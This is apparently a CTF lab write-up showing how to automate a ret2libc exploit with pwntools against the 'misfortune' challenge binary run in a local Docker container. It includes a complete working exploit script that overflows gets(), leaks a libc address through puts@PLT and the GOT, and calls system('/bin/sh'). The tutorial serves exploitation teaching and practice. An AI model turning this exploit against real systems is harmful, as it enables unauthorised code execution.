---
description: 10/08/2023
cover: https://media.tenor.com/pqckQpWm9DIAAAAC/typing-code.gif
coverY: 0
---

# ⚙️ Automating ret2libc GOT & PLT w/ pwntools

## Introduction

Here we will be covering the automation of the _**ret2libc**_ technique with `pwntools`.

> **Side note:** _pwntools is OP._

## Reference

{% embed url="https://www.youtube.com/watch?v=kvfnLvSbnhc" %}

### GitHub Repository

{% embed url="https://github.com/JohnHammond/misfortune-ctf-challenge.git" %}
John Hammond Challenge Repo
{% endembed %}

### Setup

`sudo ./setup.sh`

Everything you will need is in `/play`.

Our target is `misfortune`.

It comes with a dynamic `libc` library that is linked to our binary, `libc.so.6`.

* This tells us we are likely going to do a ROP-based attack or a _**ret2libc**_.

#### **Start docker image:**

`sudo docker run -p 9999:9999 misfortune`

#### **Connect to docker image hosting binary (to emulate remote exploitation):**

`nc localhost 9999`

You can do this remotely or locally.&#x20;

#### **Install `patchelf`:**

`sudo apt install patchelf`

#### Grab `pwninit`:

{% embed url="https://github.com/io12/pwninit/releases" %}

`wget https://github.com/io12/pwninit/releases/download/3.3.0/pwninit`

#### `pwninit`

_**Automates startup tasks for binary exploitation challenges.**_

#### Installing `elfutils`:

`sudo apt install elfutils`

#### **Running `pwninit`:**

`pwninit`

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Running <code>pwninit</code></p></figcaption></figure>

This will generate a <mark style="color:yellow;">patched file</mark> and this will be what we will want to use to develop our exploit with.

It will also make an pwn file that we can use for our exploit development called `solve.py`.

**Also, if you are doing your binex inside of WSL rather than a virtual machine, I would highly recommend that you uninstall tilix:**

`sudo apt remove tilix`

## Enumeration

`checksec`:

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

<mark style="color:yellow;">Full RELRO</mark> (<mark style="color:yellow;">Relocation Read-Only</mark>) is <mark style="color:green;">enabled</mark>, <mark style="color:yellow;">this makes the GOT completely read-only</mark>, even <mark style="color:red;">format string vulnerabilities will not be able to overwrite anything</mark>.&#x20;

* This is not default in binaries because of slow processing times since it will need to resolve all function addresses simultaneously
* This also causes the linker to resolve all symbols at link time (before starting execution) and then remove write permissions from `.got`

The <mark style="color:yellow;">NX-bit</mark> (<mark style="color:yellow;">No-Execute</mark>) is <mark style="color:green;">enabled</mark>, <mark style="color:yellow;">meaning that we do not have an executable stack</mark>.&#x20;

* <mark style="color:red;">This means we cannot inject shellcode onto the stack and expect it to execute</mark>

`file`:

{% code overflow="wrap" %}
```
misfortune: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=0729571751a2707a4b3fddcefba1a045420d1d72, not stripped
```
{% endcode %}

## "Messing" w/ the Target Binary

1. <mark style="color:yellow;">Run the binary</mark> -- What is it's goal?
2. <mark style="color:yellow;">How does the target binary consume data?</mark>
3. We noticed that there is a `SIGALRM` that timeout the binary after a period of not receiving input.
4. <mark style="color:yellow;">Can we overflow the buffer?</mark> -- Yes.

`strace`:

We were able to identify the `SIGALRM` using `strace`.

<figure><img src="../.gitbook/assets/image (161).png" alt=""><figcaption><p>Viewing <code>SIGALRM</code> w/ <code>strace</code> as a syscall.</p></figcaption></figure>

`ltrace`:

We were able to see `printf()` and `puts()` usage.

## Reversing (Static Analysis)

`main()`:

```c
undefined4 main(void)

{
  char buffer [16];
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  puts("Give me data plz: ");
  gets(buffer);
  return 0;
}
```

We see `gets()` this is where our buffer overflow is stemming from.

## Debugging (Dynamic Analysis w/ `pwndbg`)

`solve.py`:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./misfortune_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe

# Uncomment one or the other for proper process startup -- local or debugger?
def conn():
    if args.LOCAL:  
        # r = process([exe.path])     # Just start the local process
        r = gdb.debug([exe.path])   # Open with pwndbg debugger
    else:
        r = remote("127.0.0.1", 9999)

    return r


def main():
    r = conn()
    r.recvuntil(b'\n> ')
    r.send(b'A'*90)

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()

```

#### **Run:**

`python3 solve.py LOCAL`

This will open up a new tab and will throw your exploit into `pwndbg`.&#x20;

Now, <mark style="color:yellow;">continue execution</mark> in the debugger with `c`.

#### Print out register information:

`i r`

<figure><img src="../.gitbook/assets/image (162).png" alt=""><figcaption><p>Seeing our A's overwrite the base pointer (<code>rbp</code>)</p></figcaption></figure>

This is good. However, the next question we need to answer is <mark style="color:yellow;">at what point inside of the A's do we begin to see a pattern</mark> <mark style="color:yellow;">where we can begin to overflow the instruction pointer</mark>?

* We can do this by using a <mark style="color:yellow;">cyclic pattern</mark>

We have covered how to do this in `pwndbg` numerous times before, but how about we do it inside of pwntools?

We can achieve this by using `cyclic(100)` inside of our payload.

#### **Example:**

```python
    payload = b''.join([    # Use join() to join all elements in a list into one string
        cyclic(100)         # Send a 100-byte payload to the program's input
    ])
    r.send(payload)         # Send payload
```

#### Run:

`python3 solve.py LOCAL`

**Continue execution with `c`:**

<figure><img src="../.gitbook/assets/image (163).png" alt=""><figcaption></figcaption></figure>

We can see that we began overwriting the `RBP` register at the pattern, `iaaajaaa`.

We can now find our offset with `cyclic -l iaaajaaa` and we get `32`.

This means <mark style="color:yellow;">we can now modify our payload to have our offset</mark> and we can overwrite something else <mark style="color:yellow;">so we can validate which part of the stack we are overwriting</mark>.

#### Example:

```python
def main():
    
    offset = 32
    length = 90
    r = conn()
    r.recvuntil(b'\n> ')
    # r.send(b'A'*100)
    payload = b''.join([    # Use join() to join all elements in a list into one string
        b'A'*offset,
        b'\x42\x42\x42\x42\x42\x42\x42\x42', # This is the same as "BBBBBBBB", this will send 8 B's after 32 A's (our offset value) 
    ])
    
    payload += b'C'*(length -len(payload)) # A's at the top, B's for injection test, and C's for padding out the original length of data to send out

    r.send(payload)
```

Now, <mark style="color:yellow;">continue execution</mark> in the debugger with `c`.

#### Print out register information:

`i r`

<figure><img src="../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>

We can now see instead of A's (`x41`), we now see B's (`x42`) being overflowed in our `RBP` register.

<figure><img src="../.gitbook/assets/image (165).png" alt=""><figcaption></figcaption></figure>

We can also see that we have control of our instruction pointer (`RIP`) as it is being overflown with our C's (`x43`). &#x20;

#### **This is from this part of our payload:**

```python
payload += b'C'*(length -len(payload))
```

## <mark style="color:yellow;">So, what is the next thing we need to attack?</mark>

We do not have a `system()` function within the binary itself, so we will need to get it from `libc`.

&#x20;<mark style="color:yellow;">We need to utilize Return-Oriented-Programming</mark> (<mark style="color:yellow;">ROP</mark>).&#x20;

So, we need to chain locations in code and utilize their return instructions to bounce around in code since NX is enabled and we can't execute shellcode due to our non-executable stack.

We need to chain together functions in `libc` and find where they are.

In 64-bit calling conventions (which is what our target binary is that we are attacking uses), we can use ROP gadgets to pass arguments into the registers for our functions within our ROP chain.

### Stack-Alignment Issues

If we run into some weird stack alignment issues, causing our payload to break at some random point whether locally or remotely, <mark style="color:yellow;">we can simply just add a random</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`ret`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">gadget into our ROP chain, and it will in most cases, fix our stack alignment issue</mark>.

#### For example:

**We can use `ropper` to help us&#x20;**<mark style="color:yellow;">**find ROP gadgets within our binary**</mark>**:**

`ropper --file misfortune`

`0x00000000004005a6: ret;`

The hex address above is an example of a `ret` gadget.

### Using pwntools to help us find ROP gadgets

Remember how we made an ELF object in pwntools within our script?

We can do the same and create a ROP object!

#### Example:

```python
# ROP Object
rop = ROP(exe)                                       # You can use this to "pull" apart different pieces of your binary
pop_rdi = rop.find_gadget(['pop rdi'])[0]            # Find pop_rdi gadget
ret = rop.find_gadget(['ret'])[0]                    # Find ret gadget
success(f'{hex(pop_rdi)=}')                          # Print out pop_rdi gadget in hex
success(f'{hex(ret)=}')                              # Print out ret gadget in hex
```

<figure><img src="../.gitbook/assets/image (166).png" alt=""><figcaption><p>Seeing the same data that we saw in <code>ropper</code>, but automating it with pwntools</p></figcaption></figure>

#### We can also find symbols and functions that we can use (that are executed) in the binary with pwntools:

```python
main_function = exe.symbols.main
```

#### So, what will this do?

If we add `main_function` to our payload rather than our B's, we will see `main()` being executed twice!

#### NOTE:

I added this inside of the **ROP object**.

```python
def main():
    
    offset = 32
    length = 90
    r = conn()
    prompt = r.recvuntil(b'\n> ')                   
    print(prompt.decode('utf-8'))                   # Print out prompt that's given to us -- need to use utf-8 as it is sent as bytes
    # r.send(b'A'*100)
    payload = b''.join([                            # Use join() to join all elements in a list into one string
        b'A'*offset,
        #b'\x42\x42\x42\x42\x42\x42\x42\x42',       # This is the same as "BBBBBBBB", this will send 8 B's after 32 A's (our offset value) 
        p64(ret),                                   # Stack-alignment issues requires a ret gadget here
        p64(main_function),                         # Jump back into main(), executing it twice -- needs to be packed into the binary's format (64-bit representation) this is because we received the numeric value from main_function
    ])
    
    payload += b'C'*(length -len(payload))          # A's at the top, B's for injection test, and C's for padding out the original length of data to send out

    r.send(payload)

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
```

#### With this, we can now see `main()` being executed twice in our prompt:

<figure><img src="../.gitbook/assets/image (167).png" alt=""><figcaption><p>Seeing <code>main()</code> getting executed twice</p></figcaption></figure>

## Next Goals

<mark style="color:yellow;">Now, we need to figure out which functions we actually need to call</mark>.

Let's begin to build out our attack.

Let's find out where the sensitive/lucrative functions are such as `system()`.

* These are loaded inside of `libc`

<mark style="color:yellow;">However, we do not know where/how</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`libc`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">is loaded as it gets it's own, unique base address each time the binary is loaded</mark>.

It's okay, <mark style="color:green;">the binary/ELF still has "breadcrumbs" of this information that we need to be able to locate them when the program starts up</mark>.

We need to utilize the <mark style="color:yellow;">Procedure Linkage Table</mark> (<mark style="color:yellow;">`PLT`</mark>) and the <mark style="color:yellow;">Global Offset Table</mark> (<mark style="color:yellow;">`GOT`</mark>) to find these dynamically-loaded function addresses as the binary is executed.

We can actually obtain the address of `puts()`, which is found in our binary using the `PLT`. This is possible because the function is placed in a stub.&#x20;

The `GOT` will be the pointer that the `libc` function will be loaded into.

The `PLT` will allow us to call the function and allow us to jump to it.

So let's try to find another function in the `GO`T where we can grab a function that is dynamically loaded with `libc`.

This could very well be possible because we see `alarm()` being called.

We can obtain these locations/addresses by using GOT and PLT of our ELF.

```python
puts_plt = exe.plt.puts                              # Obtain puts() from PLT
alarm_got = exe.got.alarm                            # Obtain alarm() from GOT
success(f'{hex(puts_plt)=}')                         # Print location of puts() from PLT
success(f'{hex(alarm_got)=}')                        # Print location of alarm() from GOT
```

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Seeing functions obtained from both the <code>PLT</code> and <code>GOT</code>.</p></figcaption></figure>

This is great, this means that we can use the `puts()` function to display the `alarm()` function in the `GOT` through runtime.

We will need a ROP gadget (`POP_RDI`) to pop the `alarm_got` into `RDI` so we can call `puts()` from the `PLT`.

```python
def main():
    
    offset = 32
    length = 90
    r = conn()
    prompt = r.recvuntil(b'\n> ')                   
    print(prompt.decode('utf-8'))                   # Print out prompt that's given to us -- need to use utf-8 as it is sent as bytes
    # r.send(b'A'*100)
    payload = b''.join([                            # Use join() to join all elements in a list into one string
        b'A'*offset,
        #b'\x42\x42\x42\x42\x42\x42\x42\x42',       # This is the same as "BBBBBBBB", this will send 8 B's after 32 A's (our offset value) 
        p64(ret),                                   # Stack-alignment issues requires a ret gadget here
        p64(pop_rdi),                               # ROP Gadget to pop alarm_got into the RDI register
        p64(alarm_got),                              
        p64(puts_plt),                              # Call puts() from PLT
        p64(main_function),                         # Jump back into main(), executing it twice -- needs to be packed into the binary's format (64-bit representation) this is because we received the numeric value from main_function
    ])
    
    payload += b'C'*(length -len(payload))          # A's at the top, B's for injection test, and C's for padding out the original length of data to send out

    r.send(payload)

    # good luck pwning :)

    r.interactive()
```

<mark style="color:yellow;">This will display the address or bytes of the</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`alarm_got`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">function</mark>.

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Printing our address or bytes of <code>alarm_got</code></p></figcaption></figure>

We can use this to determine where to go next.

<mark style="color:yellow;">We need to find the base address.</mark>

#### We can obtain this from retrieving it via:

```python
alarm_libc = u64(r.recvline().strip().ljust(8, b'\x00')) # Retrieve value of the base address -> once our payload returns
success(f'{hex(alarm_libc)=}')    # Print out alarm_libc address
```

We will unpack the value with `u64`.

#### Upon running, you can see that we that we obtain a valid memory address:

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<mark style="color:yellow;">From our object in pwntools, we have the offset of the function, but we still do not have the base of that function</mark>.

There is a cool trick we can do to find this:

```python
    libc_base = alarm_libc - libc.symbols.alarm     # Do maths to obtain the libc base -> alarm_libc subtracted from the value of the libc object from the offset of alarm
    success(f'{hex(libc_base)=}')                   # Print out system() address                
    libc.address = libc_base
```

Essentially, we are taking the value from `alarm_libc` and subtracting it from the value of the `libc` object from the offset of `alarm()`!

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>We can now see the <code>libc</code> base address!!</p></figcaption></figure>

Now that we have the `libc` base, our next goal is to find the actual `system()` address is during runtime.&#x20;

<mark style="color:yellow;">All it takes, is taking the same syntax above and grab the</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`system()`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">function</mark>!

We want to pass the `'/bin/sh'` string to it as well. This is easy because libc has this string in the file's shared library/object comments!

```python
system = libc.symbols.system                  # Grab system() from libc symbols
bin_sh = next(libc.search(b'/bin/sh\x00'))    # Search for '/bin/sh' string in libc
success(f'{hex(system)=}')                    # Print out system() address
success(f'{hex(bin_sh)=}')                    # Print out '/bin/shell address
```

Viewing `system()` and string, `'/bin/sh'` addresses.

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Obtaining valid external function addresses and strings from the dynamically loaded library, <code>libc</code>.</p></figcaption></figure>

We now have everything we need to pwn this binary.

Lastly, we need to build out another payload that will be sent after our new prompt from `main()`.

```python
    # Payload again because we are being asked how we want to divert flow of execution in another prompt
    payload = b''.join([                        # Use join() to join all elements in a list into one string
    b'A'*offset,
    p64(ret),                                   # Stack-alignment issues requires a ret gadget here
    p64(pop_rdi),                               # ROP Gadget to pop '/bin/sh' into the RDI register
    p64(bin_sh),                                
    p64(ret),                                   # Stack-alignment issues requires a ret gadget here
    p64(system),                                # Call system() from libc
    ])

    # A's at the top, B's for injection test, and C's for padding out the original length of data to send out
    payload += b'C'*(length -len(payload))          

    r.send(payload)
```

## Final Exploit

```python
#!/usr/bin/env python3

from pwn import *

# ELF Object
exe = ELF("./misfortune_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")


# ROP Object
rop = ROP(exe)                                       # You can use this to "pull" apart different pieces of your binary
pop_rdi = rop.find_gadget(['pop rdi'])[0]            # Find pop_rdi gadget
ret = rop.find_gadget(['ret'])[0]                    # Find ret gadget
success(f'{hex(pop_rdi)=}')                          # Print out pop_rdi gadget in hex
success(f'{hex(ret)=}')                              # Print out ret gadget in hex
main_function = exe.symbols.main                     # Execute main()
puts_plt = exe.plt.puts                              # Obtain puts() from PLT
alarm_got = exe.got.alarm                            # Obtain alarm() from GOT
exit_plt = exe.plt.exit
success(f'{hex(puts_plt)=}')                         # Print location of puts() from PLT
success(f'{hex(alarm_got)=}')                        # Print location of alarm() from GOT
success(f'{hex(exit_plt)=}')

context.binary = exe

# Uncomment one or the other for proper process startup -- local or debugger?
def conn():
    if args.LOCAL:  
        # r = process([exe.path])                   # Just start the local process
        r = gdb.debug([exe.path])                   # Open with pwndbg debugger
    else:
        r = remote("127.0.0.1", 9999)

    return r

def main():
    
    offset = 32
    length = 90
    r = conn()
    prompt = r.recvuntil(b'\n> ')                   
    print(prompt.decode('utf-8'))                   # Print out prompt that's given to us -- need to use utf-8 as it is sent as bytes
    # r.send(b'A'*100)
    payload = b''.join([                            # Use join() to join all elements in a list into one string
        b'A'*offset,
        #b'\x42\x42\x42\x42\x42\x42\x42\x42',       # This is the same as "BBBBBBBB", this will send 8 B's after 32 A's (our offset value) 
        p64(ret),                                   # Stack-alignment issues requires a ret gadget here
        p64(pop_rdi),                               # ROP Gadget to pop alarm_got into the RDI register
        p64(alarm_got),                              
        p64(puts_plt),                                # Call puts() from PLT
        p64(main_function),                         # Jump back into main(), executing it twice -- needs to be packed into the binary's format (64-bit representation) this is because we received the numeric value from main_function
    ])
    
    # A's at the top, B's for injection test, and C's for padding out the original length of data to send out
    payload += b'C'*(length -len(payload))          

    r.send(payload)
    alarm_libc = u64(r.recvline().strip().ljust(8, b'\x00')) # Retrieve value of the base address -> once our payload returns
    success(f'{hex(alarm_libc)=}')

    # Do maths to obtain the libc base -> alarm_libc subtracted from the value of the libc object from the offset of alarm
    libc_base = alarm_libc - libc.symbols.alarm            
    success(f'{hex(libc_base)=}')
    libc.address = libc_base

    # Instantiating variables to find dynamically-loaded libc addresses
    system = libc.symbols.system
    bin_sh = next(libc.search(b'/bin/sh\x00'))
    success(f'{hex(system)=}')
    success(f'{hex(bin_sh)=}')

    prompt = r.recvuntil(b'\n> ')

    # Payload again because we are being asked how we want to divert flow of execution in another prompt
    payload = b''.join([                        # Use join() to join all elements in a list into one string
    b'A'*offset,
    p64(ret),                                   # Stack-alignment issues requires a ret gadget here
    p64(pop_rdi),                               # ROP Gadget to pop '/bin/sh' into the RDI register
    p64(bin_sh),                                
    p64(ret),                                   # Stack-alignment issues requires a ret gadget here
    p64(system),                                # Call system() from libc
    ])

    # A's at the top, B's for injection test, and C's for padding out the original length of data to send out
    payload += b'C'*(length -len(payload))          

    r.send(payload)

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
```

#### Run:

<mark style="color:red;">**Remote Exploitation**</mark>**:** `python3 solve.py REMOTE`

<mark style="color:red;">**Local Exploitation**</mark>**:** `python3 solve.py LOCAL`

#### Result

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Absolute pwnage.</p></figcaption></figure>
